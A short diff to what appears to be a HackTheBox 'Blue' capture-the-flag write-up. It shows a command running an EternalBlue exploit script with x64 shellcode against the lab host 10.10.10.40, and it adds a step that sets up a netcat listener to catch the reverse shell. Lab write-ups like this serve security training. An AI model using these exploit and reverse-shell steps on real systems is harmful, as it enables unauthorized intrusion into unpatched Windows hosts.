@@ -32,6 +32,7 @@ What we need to do is specify the local host, local port and time of payload.<br
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Blue/blue_shell/shell_prep.png" alt="shell_prep" width="80%">
 <b>command</b>：<code>python eternalblue_exploit7.py 10.10.10.40 shellcode/sc_x64.bin</code><br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Blue/blue_shell/sc_x64.png" alt="sc_x64" width="60%">
+Set up a netcat listener to catch reverse shell when it is executed by the victim host.<br>
 <pre text="class">
 <b>nc parameter description</b>
 -l：listen for incoming connections
